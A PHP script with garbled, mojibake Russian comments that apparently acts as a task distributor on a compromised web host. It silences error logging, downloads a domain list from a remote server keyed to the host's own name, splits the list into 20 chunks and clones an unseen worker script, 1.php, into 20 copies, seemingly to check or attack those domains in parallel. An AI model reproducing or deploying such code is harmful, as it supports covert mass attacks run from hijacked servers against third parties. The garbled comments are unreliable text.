<?php
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
function read_file($file_name) 	// $file_name - Ð¸Ð¼Ñ ÑÐµÐºÑÑ Ð´Ð¾ÐºÐ°, ÐºÐ¾ÑÐ¾ÑÑÐ¹ Ð½Ð°Ð´Ð¾ Ð¿ÑÐ¾ÑÐ¸ÑÐ°ÑÑ. $arr_name - Ð¸Ð¼Ñ Ð¼Ð°ÑÑÐ¸Ð²Ð°, Ð² ÐºÐ¾ÑÐ¾ÑÑÐ¹ Ð½Ð°Ð´Ð¾ ÑÐ¾ÑÑÐ°Ð½Ð¸ÑÑ.
{
	$list = dirname(__FILE__)."/"."$file_name";
	if (file_exists("$file_name") and (filesize("$file_name")>1))
	{
		$file = fopen($list,"rt");
		$arr_file = explode("\n",fread($file,filesize($list)));
		fclose($file);
		return $arr_file;
	}
	else
	{
		$arr_file = array();
		return $arr_file;
	}
}

$client = $_SERVER['SERVER_NAME'];

$arr_server_name = read_file('server_name.txt');		// Ð¤Ð¾ÑÐ¼Ð¸ÑÑÐµÐ¼ URL, Ð¿Ð¾ ÐºÐ¾ÑÐ¾ÑÐ¾Ð¼Ñ Ð½Ð°ÑÐ¾Ð´Ð¸ÑÑÑ ÑÐµÐºÑÑ Ð´Ð¾Ðº Ñ Ð´Ð¾Ð¼ÐµÐ½Ð°Ð¼Ð¸.
$server_name = trim($arr_server_name[0]);
$server_name = "$server_name"."$client".".txt";

if (!copy($server_name, "domains.txt")) 
{
	$arch = file_get_contents($server_name);
	if (($arch !== "") and ($arch !== " ") and ($arch !== null))
	{
		$f = fopen ("domains.txt", "w");
		fwrite($f, $arch);
		fclose($f);
	}
	else
	{
		$ch = curl_init($server_name);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
						  
		$data = curl_exec($ch);
		curl_close($ch);
						  
		file_put_contents("domains.txt", $data);
	}
}

if (file_exists('domains.txt'))
{
	$arr_all_domains = read_file('domains.txt');
	
	$count_all_domains = count($arr_all_domains);		// ÐÐ¾Ð´ÑÑÐ¸ÑÑÐ²Ð°ÐµÐ¼ Ð¾Ð±ÑÐµÐµ ÐºÐ¾Ð»-Ð²Ð¾ Ð´Ð¾Ð¼ÐµÐ½Ð¾Ð² Ð´Ð»Ñ ÑÐµÐºÐ°.
	$for_each = $count_all_domains/20;

	$arr_all_domains = array_chunk($arr_all_domains, $for_each);	// ÐºÐ¾Ð»-Ð²Ð¾ Ð´Ð¾Ð¼ÐµÐ½Ð¾Ð² Ð½Ð° ÐºÐ°Ð¶Ð´ÑÐ¹ Ð¿Ð¾ÑÐ¾Ðº.
		
	for ($c = 0; ($c < 20); $c++)						// Ð Ð°Ð·Ð±Ð¸Ð²Ð°ÐµÐ¼ ÑÐµÐºÑÑ. Ð´Ð¾Ðº Ñ Ð´Ð¾Ð¼ÐµÐ½Ð°Ð¼Ð¸ Ð½Ð° 20 ÑÐ°Ð²Ð½ÑÑ ÑÐ°ÑÑÐµÐ¹.
	{
		$file_name = ($c+1);
		$file_name .= '.txt';
		$fnew = fopen("$file_name", "w");
		for ($o = 0; ($o <= $for_each); $o++)
		{
			fwrite($fnew, $arr_all_domains[$c][$o]);
			fwrite($fnew, "\n");
		}
		fclose($fnew);
	}
	
	$file = '1.php';									// ÐÐ»Ð¾Ð½Ð¸ÑÑÐµÐ¼ Ð¸ÑÐ¿Ð¾Ð»Ð½Ð¸ÑÐµÐ»ÑÐ½ÑÐ¹ ÑÐºÑÐ¸Ð¿Ñ Ð² 20-ÑÐ¸ ÑÐºÐ·ÐµÐ¼Ð¿Ð»ÑÑÐ°Ñ.
	for ($i = 2; ($i <= 20); $i++) 
	{
		$newfile = "$i.php";
		copy($file, $newfile);
	}
	echo "~Main script has been cloned!~";
}
else
{
	echo "ERROR!";
}
?>